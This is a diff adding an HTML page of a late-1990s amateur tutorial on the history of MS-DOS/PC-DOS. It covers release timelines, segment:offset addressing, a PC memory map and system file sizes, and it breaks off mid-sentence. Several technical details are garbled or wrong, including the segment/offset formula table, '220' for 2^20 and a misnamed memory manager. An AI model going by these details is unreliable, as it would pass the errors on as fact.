@@ -1,0 +1,886 @@
+<html>
+<head>
+<title>The History of DOS</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<div align="center"><b> <font size="5"> </font></b>
+  <table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+    <tr> 
+      <td width="693"> 
+        <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="%20http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I    <b>The History of DOS</b>       I   Written by:     /
+    >                     I<b>(c)1999 by Paroxysm(20-11-98)</b>I                  < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   Paroxysm        \
+  /___________________________>                    <_________________________\</pre>
+      </td>
+    </tr>
+  </table>
+  <p>&nbsp;</p>
+  <p>&nbsp; </p>
+</div>
+<p><b><font size="4">Contents:</font></b></p>
+<ul>
+  <li><a href="#0">Disclaimer</a></li>
+  <li><a href="#1">Introduction</a></li>
+  <li><a href="#2">History</a></li>
+  <li><a href="#3">The Memory Map</a></li>
+  <li><a href="#4">Timeline and History Chart</a></li>
+  <li><a href="#5">Future of DOS</a></li>
+  <li><a href="#6">Postscript</a></li>
+  <li><a href="#7">Bibliography</a></li>
+</ul>
+<p><b><font size="4"><a name="0"></a>Disclaimer:</font></b></p>
+<p>Although this document is purely informative, the author claims no responsibility 
+  for any misguided souls who find a way to twist its contents into anything harmful 
+  or overly offensive.</p>
+<p><b><font size="4"><a name="1"></a>Introduction:</font></b></p>
+<p>When a computer is turned on an Operating System must be loaded into the computer's 
+  memory before the user can begin using it. IBM compatible machines use an operating 
+  system called MS-DOS. MS stands for &quot;MicroSoft&quot; (a trade name), while 
+  DOS stands for &quot;Disk Operating System&quot;, which tells us that it's original 
+  purpose was to provide an interface between a computer and its disk drives. 
+  Technically, DOS is a high-level interface between an application program and 
+  the computer. </p>
+<p>DOS has been extended further, allowing programs to handle the likes of simple 
+  memory management, disk operations, assorted system tasks (e.g. date/time), 
+  user input commands and managing input/output (i/o) devices (i.e. it provides 
+  operating instructions for the computer to manage both hardware and software). 
+  Versions 3.1 and up also provide basic networking functions.</p>
+<p>Beyond this, DOS provides the user with the important facility of file and 
+  disk management (often referred to as disk-housekeeping). This part of DOS is 
+  particularly crucial to the user as it was specifically designed for him or 
+  her to interact with.</p>
+<p>With the advent of installable device drivers and TSR (Terminate but Stay Resident) 
+  programs in DOS v2.0, the basic DOS functions could be extended to handle virtually 
+  any scale of operations required. This was the first instance of multiple programs 
+  being run at once in DOS. Some TSR's can however interfere with the running 
+  of programs. When a program is loaded into memory it assumes that it has exclusive 
+  use of this memory and will not take into account the fact that another program 
+  (the TSR) is also using this area. Thus a conflict can arise causing the program 
+  to hang (hang means that the screen freezes and the task being executed stops 
+  responding forcing the user to either switch off or reboot the computer).</p>
+<p><b><font size="4"><a name="2"></a>History:</font></b></p>
+<p>The development of MS-DOS/PC-DOS began in October 1980, when IBM began searching 
+  the market for a suitable operating system to go with their soon to be released 
+  IBM PC's (commercial Personal Computers). IBM had originally intended to use 
+  Digital Research's industry standard operating system - CP/M (Control Program/Monitor 
+  or Control Program for Microcomputer - originally written in 1973 by Gary Kildall 
+  in his PL/M language). This was never implemented due to uncertain reasons, 
+  the most likely being poor diplomatic relations between the two companies. Later, 
+  IBM approached a relatively small company called Microsoft, which specialised 
+  in language vending. Bill Gates and Paul Allen had written Microsoft BASIC and 
+  were selling it on punched tape or disk to early PC hobbyists.</p>
+<p>Earlier, in April 1980, Tim Patterson began writing an operating system for 
+  use with Seattle Computer Products' 8086-based (S100 bus micros) computer. Seattle 
+  Computer Products decided to come up with their own disk operating system, due 
+  to delays by Digital Research in releasing a CP/M-86 operating system. By August 
+  86-DOS or QDOS v0.10 (Quick and Dirty Operating System) was shipped by Seattle 
+  Computer Products. It was a 16-bit version of CP/M. Even though it had been 
+  created in only two man-months, the DOS worked surprisingly well. A week later, 
+  the EDLIN line editor was created. EDLIN was supposed to last only six months, 
+  before being replaced, but it endured for longer.</p>
+<p>In September Tim Patterson showed Microsoft his 86-DOS, written for the 8086 
+  chip. At this stage Microsoft had no 8086 real operating system to offer, but 
+  capitalized when, in October, Microsoft's Paul Allen contacted Patterson, asking 
+  for the rights to sell SCP's DOS to an unnamed client (IBM). Microsoft paid 
+  less than $100 000 for the rights. Patterson's DOS v1.0 was approximately 4000 
+  lines of assembler source. This code was quickly polished up and presented to 
+  IBM for evaluation.</p>
+<p>An agreement was reached between the two companies and IBM agreed to accept 
+  86-DOS as the main operating system for their new PC. In February 1981, 86-DOS 
+  was run for the first time on IBM's prototype microcomputer. Furthermore, Microsoft 
+  purchased all rights to 86-DOS in July 1981.</p>
+<p>In August, IBM announced the IBM 5150 PC, featuring a 4.77-MHz Intel 8088 CPU, 
+  64KB RAM, 40KB ROM, one 5.25-inch floppy drive, and PC-DOS 1.0 (Microsoft's 
+  MS-DOS), for $3000.</p>
+<p>Thus, &quot;IBM Personal Computer DOS v1.0&quot; was available for the introduction 
+  of the IBM PC in October 1981. IBM heavily subjected the program to an extensive 
+  quality-assurance test and found there to be well over 300 bugs and decided 
+  to rewrite the programs. This is why PC-DOS is copyrighted to both Microsoft 
+  and IBM.</p>
+<p>Some early OEM (Original Equipment Manufacture) versions of DOS had different 
+  names such as Compaq-DOS, Z-DOS, Software Bus 86, etc. By version 2.0 Microsoft 
+  had succeeded to persuade everyone but IBM to call it MS-DOS.</p>
+<p>It is interesting to reflect on the fact that the IBM PC was not originally 
+  meant to run MS-DOS. Instead it was supposed to use a (not yet in existence) 
+  8086 version of CP/M. On the other hand, DOS was originally written before the 
+  IBM PC was created. CP/M-86 would have been the main operating system except 
+  for two things: Digital Research wanted $495 for CP/M-86 (considering PC-DOS 
+  was basically free) and many software developers found it easier to port software 
+  from CP/M into PC-DOS than into CP/M-86.</p>
+<p>The IBM PC was first shipped without an operating system. IBM only started 
+  including DOS when the second generation AT/339 came out. A user could order 
+  one of three available operating systems: IBM PC-DOS, a version of UCSD p-System 
+  (type of integrated Pascal operating system - like the improved BASIC operating 
+  systems used by the Commodore 64,) and CP/M-86, which was officially an option 
+  even though it was unavailable until later on. Since IBM's $39.95 DOS was much 
+  cheaper than anyone else's it soon became the most popular.</p>
+<p>An upgrade from DOS v3.3 to v4.0 was solely done by IBM, it was later licenced 
+  back to Microsoft. In early 1990 IBM declared that it would be ceasing development 
+  of DOS, handing the reigns over to Microsoft from then on.</p>
+<p>Microsoft's Press' &quot;MSDOS Encyclopaedia&quot; illustrated an example of 
+  a late DOS v1.25 OEM brochure. Microsoft was praising future enhancement to 
+  v1.25 including XENIX-compatible pipes, process forks and multitasking, as well 
+  as &quot;graphics and cursor positioning, kanji support, multi-user and hard 
+  disk support and networking&quot;. Despite these large aspirations, Microsoft 
+  failed to produce the forks, multitasking and multi-user support (at least in 
+  US versions of DOS).</p>
+<p>The notice claimed: &quot;MS-DOS has no practical limit on disk size. MS-DOS 
+  uses 4-byte XENIX OS compatible pointers for a file and disk capacity of up 
+  to 4 gigabytes.&quot;</p>
+<p>For the record they actually delivered:</p>
+XENIX-compatible pipes:<br>
+DOS 2.0 (&quot;|&quot; operator)<br>
+---<br>
+process forks, and multitasking:<br>
+eDOS 4.0 (not delivered in the US)<br>
+---<br>
+multi-user:<br>
+never delivered<br>
+---<br>
+graphics and cursor positioning:<br>
+DOS 2.0 (ANSI.SYS)<br>
+---
+<p>kanji support:<br>
+  DOS 2.01, 2.25 (double-byte character set)<br>
+  ---<br>
+  hard disk support:<br>
+  DOS 2.0 (subdirectories)<br>
+  ---<br>
+  networking:<br>
+  DOS 3.1 (file locking support MS Networks)<br>
+  DOS 6.0 (bundled Interlink in with DOS)<br>
+  ---</p>
+<p>Microsoft launched an aggressive marketing campaign for MS-DOS. Early Microsoft 
+  advertisements promoted DOS' XENIX-like features and promised XENIX functionality 
+  in future releases.</p>
+<p>Microsoft had announced their intention of building a multi-user, multitasking 
+  operating system since as early as 1982. They Shipped beta versions of &quot;DOS 
+  4.0&quot; in 1986/87 before v3.3 was even announced. Microsoft UK had announced 
+  that they had licenced v4.0 to Apricot Computers and the French Postal Service 
+  was supposed to be running it.</p>
+<p>MS-DOS and PC-DOS have been run on more than just the IBM-PC and clones:</p>
+<p>Hardware PC Emulation:</p>
+<table width="80%" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td>Apple II </td>
+    <td>TransPC 8088 board</td>
+  </tr>
+  <tr>
+    <td>Apple MacIntosh </td>
+    <td>AST 80286 board</td>
+  </tr>
+  <tr>
+    <td>Atari 400/800 </td>
+    <td>Co-Power 88 board</td>
+  </tr>
+  <tr>
+    <td>Atari ST </td>
+    <td>PC-Ditto II cartridge</td>
+  </tr>
+  <tr>
+    <td>Amiga 2000</td>
+    <td>8088 or A2286D 80286 Bridge Board</td>
+  </tr>
+  <tr>
+    <td>IBM PC/RT</td>
+    <td>80286 AT adapter</td>
+  </tr>
+  <tr>
+    <td>Kaypro 2 </td>
+    <td>Co-Power Plus board</td>
+  </tr>
+</table>
+<p>Software PC Emulation:</p>
+<table width="80%" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td>Apple MacIntosh</td>
+    <td>SoftPC</td>
+  </tr>
+  <tr>
+    <td> Atari ST </td>
+    <td>PC-Ditto I</td>
+  </tr>
+  <tr>
+    <td> IBM RS/6000 </td>
+    <td>DOS emulation</td>
+  </tr>
+</table>
+<p>DOS Emulation:</p>
+<table width="80%" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td>AIX (IBM RS/6000)</td>
+    <td>DOS emulation with &quot;PCSIMulator&quot;</td>
+  </tr>
+  <tr>
+    <td>OS/2 1.x </td>
+    <td>DOS emulation in &quot;Compatibility Box&quot;</td>
+  </tr>
+  <tr>
+    <td>OS/2 2.x </td>
+    <td>executes Virtual DOS Machine</td>
+  </tr>
+  <tr>
+    <td>QNX</td>
+    <td>DOS window</td>
+  </tr>
+  <tr>
+    <td>SunOS</td>
+    <td>DOS window</td>
+  </tr>
+  <tr>
+    <td>XENIX </td>
+    <td>DOS emulation with DOSMerge</td>
+  </tr>
+</table>
+<p><b><font size="4"><a name="3"></a>The Memory Map:</font></b></p>
+<p>About a decade ago, standard memory configurations were 256KB, 512KB or 640KB 
+  on computers. This memory was often looked at in segments of 65536 bytes or 
+  64KB. The user is allocated 10 segments, or 640KB and the system is allocated 
+  the remaining 6, or 384KB. The original designers of the 8088, decided that 
+  no one would ever possibly need more than 1MB of memory (yeah, right!). So they 
+  built the machine so that it couldn't access above 1 MB. To access the whole 
+  MEG, 20 bits are needed. This allows a total of 220 combinations of bits, that 
+  is 1048576 (= 1024*1024 or 1 MB) different numbers, each of which represents 
+  an address of a single byte of data. The problem was that the registers only 
+  had 16 bits, and if they used two registers, that would be 32 bits, which was 
+  way too much (they thought). So they came up with a rather brilliant (not!) 
+  way to do their addressing - they would use two registers. They decided that 
+  they would not be 32bits, but the two registers would create 20 bit addressing. 
+  And thus Segments and Offsets were created.</p>
+<p>**Note: it helps to understand assembly code.</p>
+<table width="98%" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td>OFFSET</td>
+    <td align="center">=</td>
+    <td>SEGMENT*16</td>
+  </tr>
+  <tr>
+    <td>SEGMENT</td>
+    <td align="center">=</td>
+    <td>OFFSET/16 - note that the lower 4 bits are lost</td>
+  </tr>
+</table>
+<p><pre>
+SEGMENT * 16    |0010010000010000----| - range (0 to 65535)*16
+ +                    
+OFFSET          |----0100100000100010| - range (0 to 65535)
+ =
+20 bit address  |00101000100100100010| - range 0 to 1048575 (1 MB)
+                   \----- DS -----/
+                   \----- SI -----/
+                     \- Overlap-/</pre>
+<p>This shows how DS : SI is used to construct a 20 bit address.</p>
+<p>Segment registers are: CS, DS, ES, SS. On the 386+ there are also FS &amp; 
+  GS.</p>
+<p>Offset registers are: BX, DI, SI, BP, SP, IP. In 386+ protected mode, any general 
+  register (not a segment register) can be used as an offset register (except 
+  IP, which isn't accessable).</p>
+<table width="98%" border="0" cellspacing="2" cellpadding="2">
+  <tr>
+    <td>CS</td>
+    <td align="center">:</td>
+    <td>IP</td>
+    <td>Points to the currently executing code.</td>
+  </tr>
+  <tr>
+    <td>SS</td>
+    <td align="center">:</td>
+    <td>SP</td>
+    <td>Points to the current stack position.</td>
+  </tr>
+</table>
+<p>If you'll notice, the value in the segment register is multiplied by 16 (or 
+  shifted left 4 bits) and then added to the offest register. Together they create 
+  a 20 bit address. Thus, there are many combinations of the segment and offset 
+  registers that will produce the same address. The standard notation for a SEGment/OFFset 
+  pair is:</p>
+<table width="98%" border="0" cellspacing="2" cellpadding="2">
+  <tr align="center"> 
+    <td>SEGMENT</td>
+    <td>:</td>
+    <td>OFFSET or A000</td>
+    <td>:</td>
+    <td>0000 (in hexadecimal)</td>
+  </tr>
+</table>
+<p>Where SEGMENT = 0A000h and OFFSET = 00000h.<br>
+  (This happens to be the address of the upper left pixel on a 320x200x256 screen.)<br>
+  You may be wondering what would happen if you were to have a segment value of 
+  0FFFFh and an offset value of 0FFFFh.</p>
+<p>Notice how &lt;0FFFFh * 16 (or 0FFFF0h ) + 0FFFFh = 1,114,095&gt; is larger 
+  than 1,048,576 (or 1 MEG).</p>
+<p>This means that more than 1 MB of memory is actually accessible! Well, to actually 
+  use that extra bit of memory, you would have to enable something called the 
+  A20 line, which just enables the 21st bit for addressing. This little extra 
+  bit of memory is usually called &quot;HIGH MEMORY&quot; and is used when you 
+  load something into high memory or say DOS = HIGH in your AUTOEXEC.BAT file 
+  or DEVICEHIGH=MOUSE.SYS in your CONFIG.SYS file (HIMEM.SYS and EMS386.EXE actually 
+  manage that).</p>
+<p>Here is an illustration of a typical memory map:</p>
+<p>The IBM PC handles its address space in 64k segments, divided into <br>
+  16k fractions and then further as necessary:</p>
+<p><pre>
+*********************************************************************
+*start *start*end  *                                                *
+*addr. *addr.*addr.*                     usage                      *
+*(dec) *   (hex)   *                                                *
+*********************************************************************
+*   *640k RAM Area*                                                 *
+*********************************************************************
+* 0k   *         *  start of RAM, first K is interrupt vector table *
+* 16k  *0000-03FF*  PC-0 system board RAM ends                      *
+* 32k  *0400-07FF*                                                  *
+* 48k  *0800-0BFF*                                                  *
+*********************************************************************
+* 64k  *1000-13FF*  PC-1 system board RAM ends                      *
+* 80k  *1400-17FF*                                                  *
+* 96k  *1800-1BFF*                                                  *
+* 112k *1C00-1FFF*                                                  *
+*********************************************************************
+* 128k *2000-23FF*                                                  *
+* 144k *2400-27FF*                                                  *
+* 160k *2800-2BFF*                                                  *
+* 176k *2C00-2FFF*                                                  *
+*********************************************************************
+* 192k *3000-33FF*                                                  *
+* 208k *3400-37FF*                                                  *
+* 224k *3800-3BFF*                                                  *
+* 240k *3C00-3FFF*                                                  *
+*********************************************************************
+* 256k *4000-43FF*  PC-2 system board RAM ends                      *
+* 272k *4400-47FF*                                                  *
+* 288k *4800-4BFF*                                                  *
+* 304k *4C00-4FFF*                                                  *
+*********************************************************************
+* 320k *5000-53FF*                                                  *
+* 336k *5400-57FF*                                                  *
+* 352k *5800-5BFF*                                                  *
+* 368k *5C00-5FFF*                                                  *
+*********************************************************************
+* 384k *6000-63FF*                                                  *
+* 400k *6400-67FF*                                                  *
+* 416k *6800-6BFF*                                                  *
+* 432k *6C00-6FFF*                                                  *
+
+
+
+*********************************************************************
+* 448k *7000-73FF*                                                  *
+* 464k *7400-77FF*                                                  *
+* 480k *7800-7BFF*                                                  *
+* 496k *7C00-7FFF*                                                  *
+*********************************************************************
+* 512k *8000-83FF*                                                  *
+* 528k *8400-87FF*                                                  *
+* 544k *8800-8BFF*  the original IBM PC-1 BIOS limited memory to    *
+* 560k *8C00-8FFF*  544k                                            *
+*********************************************************************
+* 576k *9000-93FF*                                                  *
+* 592k *9400-97FF*                                                  *
+* 609k *9800-9BFF*                                                  *
+* 624k *9C00-9FFF* to 640k (top of RAM address space)               *
+* 639k *         * some RLL and SCSI hard disk adapters, some four  *
+*      *         * floppy controller cards, some AMI and PS/2 BIOS, *
+*      *         * and assorted other cards sometimes try to use the*
+*      *         * last K for storing temporary data.  This can     *
+*      *         * cause trouble with programs which assume they    *
+*      *         * have a full 640k, and will prevent backfilling   *
+*      *         *  memory with some memory managers.  Beware!      *
+*********************************************************************
+*A0000 ***** 64k ***** EGA/VGA starting address                     *
+*A0000 ***** 64k ***** Toshiba 1000 DOS ROM (MS-DOS 2.11V)          *
+*********************************************************************
+* 640k *A0000-A95B0*  MCGA 320x200 256 color video buffer           *
+*      *     -AF8C0*  MCGA 640x480 2 color video buffer             *
+*      *     -A3FFF*                                                *
+* 656k *A4000-A7FFF*                                                *
+* 672k *A8000-ABFFF*this 64k segment may be used for contiguous DOS *
+* 688k *AC000-AFFFF*RAM with appropriate hardware and software      *
+*********************************************************************
+*B0000 ***** 64k ***** mono and CGA address                         *
+*********************************************************************
+* 704k *B0000-B3FFF*4k  mono display | The PCjr and early Tandy 1000*
+* 720k *B4000-B7FFF*                 | BIOS revector direct write to*
+* 736k *B8000-BBFFF*16k CGA          | the B8 area to the Video Gate*
+* 756k *BC000-BFFFF*                 | Array and reserved system RAM*
+*********************************************************************
+*C0000 ***** 64k *************** expansion ROM                      *
+*********************************************************************
+* 768k *C0000-C3FFF*16k EGA BIOS C000:001E EGA BIOS signature       *
+*      *           *    (the letters 'IBM')                         *
+*      *C0000-C7FFF*32k VGA BIOS extension (typical)                *
+* 784k *C4000-C5FFF*                                                *
+*      *C6000-C63FF*256 bytes IBM PGC video communications area     *
+*      *C6400-C7FFF*                                                *
+* 800k *C8000-CBFFF*16k hard disk controller BIOS, drive 0 default  *
+*      *CA000      *    some 2nd floppy (HD) controller BIOSes      *
+* 816k *CC000-CDFFF* 8k IBM PC Network NETBIOS                      *
+*      *CE000-CFFFF*                                                *
+*********************************************************************
+*D0000 ***** 64k ***** expansion ROM                                *
+*********************************************************************
+* 832k *D0000-D7FFF*32k IBM Cluster Adapter  | PCjr first ROM cart. *
+*      *      DA000*voice communications     | address area.        *
+* 848k *D4000-D7FFF*                         | Common EMS board     *
+* 864k *D8000-DBFFF*                         | paging area.         *
+*      *D8000-DBFFF* IBM Token Ring default Share RAM address       *
+*      *DC000      * IBM Token Ring default BIOS/MMIO address       *
+* 880k *DC000-DFFFF*                         |                      *
+*      *DE000      *4k  TI Pro default video buffer                 *
+*********************************************************************
+*E0000 ***** 64k ***** expansion ROM                                *
+*                      wired to ROM sockets in the original IBM AT  *
+*                      used by ABIOS extensions on some PS/2 models *
+*********************************************************************
+* 896k *E0000-E3FFF*                         | PCjr second ROM cart.*
+* 912k *E4000-E7FFF*                         | address area         *
+* 928k *E8000-EBFFF*                         |                      *
+* 944k *EC000-EFFFF*                         | spare ROM sockets on *
+*      *           *                         | IBM AT (reserved in  *
+*      *           *                         | hardware)            *
+*********************************************************************
+*F0000 ***** 64k ***** system                                       *
+*********************************************************************
+* 960k *F0000-F3FFF*reserved by IBM          | cartridge address    *
+* 976k *F4000-     *                         | area (PCjr cartridge *
+*      *F6000      *ROM BASIC Begins         | BASIC)               *
+* 992k *F8000-FB000*                         |                      *
+* 1008k*FC000-FFFFF*ROM BASIC and original   |                      *
+*      *           *BIOS (Compatibility BIOS |                      *
+*      *           *in PS/2)                 |                      *
+* 1024k*      FFFFF*end of memory (1024k) for 8088 machines         *
+*********************************************************************
+* 384k *100000-15FFFF* 80286/AT extended memory area, 1Mb mbd.      *
+* 15Mb *100000-FFFFFF* 80286/AT extended memory address space       *
+* 15Mb *160000-FDFFFF* Micro Channel RAM expansion (15Mb ext. mem)  *
+* 128k *FE0000-FFFFFF* system board ROM        (PS/2 Advanced BIOS) *
+*********************************************************************
+*  64k *C0000000-C000FFFF* Weitek "Abacus" math coprocessor         *
+*      *                 * memory-mapped I/O                        *
++*******************************************************************+</pre>
+<p><b><font size="4"><a name="4"></a>Timeline:</font></b></p>
+<p>In May 1982, Microsoft released MS-DOS v1.1 to IBM, for the IBM PC. It supported 
+  320KB double-sided floppy disk drives. Microsoft also released MS-DOS v1.25, 
+  similar to v1.1 but for IBM-compatible computers.</p>
+<p>In March 1983, MS-DOS v2.0 for PCs is announced. It was written from scratch, 
+  supporting 10 MB hard drives, a tree-structured file system, and 360 KB floppy 
+  disks. October saw IBM introducing PC-DOS v2.1 with the IBM PCjr.</p>
+<p>In March 1984, Microsoft released MS-DOS v2.1 for the IBM PCjr. Microsoft released 
+  MS-DOS v2.11 a short time later. It included enhancements to better allow conversion 
+  into different languages and date formats. In August, Microsoft released MS-DOS 
+  v3.0 for PCs. It added support for 1.2MB floppy disks, and bigger (than 10 MB) 
+  hard disks. In November, Microsoft released MS-DOS v3.1, adding support for 
+  Microsoft networks.</p>
+<p>In January 1986, Microsoft released MS-DOS v3.2. It added support for 3.5-inch 
+  720 KB floppy disk drives. Microsoft released MS-DOS v3.25 as well.</p>
+<p>In April 1987, IBM announced DOS v3.3 for PCs, for $120. In August Microsoft 
+  shipped MS-DOS v3.3. In November Compaq shipped MS-DOS v3.31 with support for 
+  over 32MB drives.</p>
+<p>In 1988 Digital Research transformed CP/M into DR DOS. In June Microsoft released 
+  MS-DOS v4.0, including a graphical/mouse interface. In July IBM shipped DOS 
+  v4.0, which included a shell menu interface and support for hard disk partitions 
+  over 32 MB. In November Microsoft released MS-DOS v4.01.</p>
+<p>In April 1990, Microsoft introduced Russian MS-DOS v4.01 for the Soviet market.<br>
+  May saw Digital Research releasing DR DOS v5.0.</p>
+<p>In June 1991, Microsoft released MS-DOS v5.0. It added a full-screen editor, 
+  undelete and unformat utilities and task swapping. GW-BASIC is replaced with 
+  Qbasic, based on Microsoft's QuickBASIC. In September Digital Research Inc. 
+  releases DR DOS v6.0, for $100.</p>
+<p>In March 1993, Microsoft introduced the MS-DOS v6.0 upgrade, including DoubleSpace 
+  disk compression. 1 million copies of the new and upgraded versions were sold 
+  through retail channels within the first 40 days. In November, Microsoft released 
+  MS-DOS v6.2.</p>
+<p>In February 1994, Microsoft released MS-DOS v6.21, removing DoubleSpace disk 
+  compression. April IBM releases PC-DOS v6.3. In June Microsoft releases MS-DOS 
+  v6.22, bringing back disk compression under the name DriveSpace.</p>
+<p>In February 1995, IBM announced PC DOS v7, with integrated data compression 
+  from Stac Electronics (Stacker). In April, IBM released PC DOS v7. In August 
+  of 1995 Microsoft introduced Windows 95, it included MS DOS v7.0 but it's clear 
+  that DOS is going to remain a constant for several years to come.</p>
+<p><b>DOS HISTORY CHART: (system file sizes in bytes)</b></p>
+<table width="99%" border="1" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td>DOS TYPE AND VERSION</td>
+    <td>DATE</td>
+    <td>COMMAND.COM</td>
+    <td>IO.SYS or IBMBIO.COM</td>
+    <td>MSDOS.SYS or IBMDOS.COM</td>
+  </tr>
+  <tr> 
+    <td>PC 1.0</td>
+    <td>8-4-81</td>
+    <td>3,231</td>
+    <td>1,920 </td>
+    <td> 6,400</td>
+  </tr>
+  <tr> 
+    <td>MS 1.0</td>
+    <td>8-4-81</td>
+    <td>3,231 </td>
+    <td>1,920</td>
+    <td> 6,400</td>
+  </tr>
+  <tr> 
+    <td>PC 1.1</td>
+    <td>5-7-82</td>
+    <td>4,959 </td>
+    <td>1,920</td>
+    <td> 6,400</td>
+  </tr>
+  <tr> 
+    <td>PC 2.0</td>
+    <td>3-8-83</td>
+    <td>17,792</td>
+    <td>4,608 </td>
+    <td>17,152</td>
+  </tr>
+  <tr> 
+    <td>MS 2.0</td>
+    <td>3-8-83</td>
+    <td>17,792</td>
+    <td>4,608 </td>
+    <td>17,152</td>
+  </tr>
+  <tr> 
+    <td>PC 2.1</td>
+    <td>10-20-83</td>
+    <td>17,792</td>
+    <td>4,736</td>
+    <td>17,024</td>
+  </tr>
+  <tr> 
+    <td>MS 2.11</td>
+    <td>11-17-83</td>
+    <td>15,957</td>
+    <td>6,836</td>
+    <td>17,176</td>
+  </tr>
+  <tr> 
+    <td>PC 2.11</td>
+    <td>5-30-84</td>
+    <td>18,272</td>
+    <td>5,120 </td>
+    <td> 17,408</td>
+  </tr>
+  <tr> 
+    <td>PC 3.0</td>
+    <td>8-14-84</td>
+    <td>22,042 </td>
+    <td>8,964</td>
+    <td>27,920</td>
+  </tr>
+  <tr> 
+    <td>MS 3.0</td>
+    <td>8-14-84</td>
+    <td>22,042 </td>
+    <td>8,964</td>
+    <td>27,920</td>
+  </tr>
+  <tr> 
+    <td>PC 3.1</td>
+    <td>3-7-85 </td>
+    <td>23,210</td>
+    <td>9,564 </td>
+    <td>27,760</td>
+  </tr>
+  <tr> 
+    <td>MS 3.1</td>
+    <td>3-7-85 </td>
+    <td>23,210 </td>
+    <td>9,564 </td>
+    <td>27,760</td>
+  </tr>
+  <tr> 
+    <td>PC 3.2</td>
+    <td>12-30-85</td>
+    <td>23,791 </td>
+    <td>16,369</td>
+    <td>28,477</td>
+  </tr>
+  <tr> 
+    <td>MS 3.2 </td>
+    <td>7-7-86 </td>
+    <td>23,612 </td>
+    <td>16,138</td>
+    <td>28,480</td>
+  </tr>
+  <tr> 
+    <td>MS 3.21</td>
+    <td>5-1-87</td>
+    <td>23,948 </td>
+    <td>18,501</td>
+    <td>28,480</td>
+  </tr>
+  <tr> 
+    <td>PC 3.3</td>
+    <td>3-17-87 </td>
+    <td>25,307</td>
+    <td>22,100</td>
+    <td>30,159</td>
+  </tr>
+  <tr> 
+    <td>MS 3.3</td>
+    <td> 7-24-87</td>
+    <td>25,276</td>
+    <td>22,357 </td>
+    <td>30,128</td>
+  </tr>
+  <tr> 
+    <td>MS 3.3a</td>
+    <td>2-2-88 </td>
+    <td>25,308 </td>
+    <td>22,398 </td>
+    <td>30,128</td>
+  </tr>
+  <tr> 
+    <td>MS 4.0 </td>
+    <td>10-6-88 </td>
+    <td>37,254 </td>
+    <td>32,874</td>
+    <td>36,903</td>
+  </tr>
+  <tr> 
+    <td>MS 4.01 </td>
+    <td>11-30-88</td>
+    <td>37,396 </td>
+    <td>33,173</td>
+    <td>37,180</td>
+  </tr>
+  <tr> 
+    <td>PC 4.01</td>
+    <td> 4-3-89 </td>
+    <td>37,396 </td>
+    <td>33,173</td>
+    <td>37,180</td>
+  </tr>
+  <tr> 
+    <td>MS 4.01a </td>
+    <td>4-7-89 </td>
+    <td>37,557</td>
+    <td>33,337</td>
+    <td>37,376</td>
+  </tr>
+  <tr> 
+    <td>MS 5.0</td>
+    <td>4-9-91</td>
+    <td>33,430 </td>
+    <td>37,394 </td>
+    <td>47,845</td>
+  </tr>
+  <tr> 
+    <td>PC 5.0</td>
+    <td>5-9-91 </td>
+    <td>47,987 </td>
+    <td>33,430 </td>
+    <td> 37,378</td>
+  </tr>
+  <tr> 
+    <td>PC 5.001a </td>
+    <td> 2-28-92 </td>
+    <td>48,006 </td>
+    <td>33,446 </td>
+    <td> 37,378</td>
+  </tr>
+  <tr> 
+    <td>PC 5.02</td>
+    <td>9-1-92</td>
+    <td>47,990</td>
+    <td>33,718 </td>
+    <td>37,362</td>
+  </tr>
+  <tr> 
+    <td>MS 6.0</td>
+    <td> 3-10-93</td>
+    <td>52,925 </td>
+    <td>40,470</td>
+    <td>38,138</td>
+  </tr>
+  <tr> 
+    <td>IBM 6.1 </td>
+    <td> 6-29-93 </td>
+    <td>52,589</td>
+    <td>40,964 </td>
+    <td>38,138</td>
+  </tr>
+  <tr> 
+    <td>PC 6.1 </td>
+    <td> 9-30-93 </td>
+    <td>52,797</td>
+    <td>40,964 </td>
+    <td>38,138</td>
+  </tr>
+  <tr> 
+    <td>MS 6.2R0</td>
+    <td>9-30-93</td>
+    <td>54,619 </td>
+    <td>40,566 </td>
+    <td>38,138</td>
+  </tr>
+  <tr> 
+    <td>MS 6.22 </td>
+    <td>5-31-94</td>
+    <td> 54,645 </td>
+    <td>40,774 </td>
+    <td>38,138</td>
+  </tr>
+  <tr> 
+    <td>PC 6.3 </td>
+    <td> 12-31-93 </td>
+    <td>54,654</td>
+    <td>40,758 </td>
+    <td>37,174</td>
+  </tr>
+</table>
+<p>**Note: Microsoft had no official version of MS DOS prior to DOS 3.2. Only 
+  OEM versions were sold with the PC by the computer manufacture.</p>
+<p><b><font size="4"><a name="5"></a>Future of DOS:</font></b></p>
+<p>At first, many people would answer saying that DOS has no future. It has seen 
+  it's heyday and now it's up to high-resolution GUI's (Graphic User-Interfaces 
+  - e.g. Windows 95) to lead the operating system pack. But let's not be too quick 
+  to dismiss it. There are many reasons why DOS is an essential part of many of 
+  today's finest systems.</p>
+<p>Talk to mainstream computer industry &quot;specialists&quot; and they'd have 
+  you believe that there is no longer any place for it. Why? Because they don't 
+  understand the special speed and performance requirements unique to systems 
+  other than &quot;supercomputers with neuro-networking&quot;. I'm talking about 
+  the many hundreds of thousands of users that depend on older systems to support 
+  their businesses. Low-tech industries rely heavily on computers with old versions 
+  of DOS installed on them. The average &quot;business person&quot; here doesn't 
+  need anything better than a 486SX with 8MB of RAM to run their MS-DOS based 
+  accounting program. This shouldn't be made redundant just because DOS is so-called 
+  &quot;outdated&quot;. This is also where the highest resistance to the removal 
+  of DOS has come from.</p>
+<p>Despite this, many people believe that old DOS programs are becoming redundant 
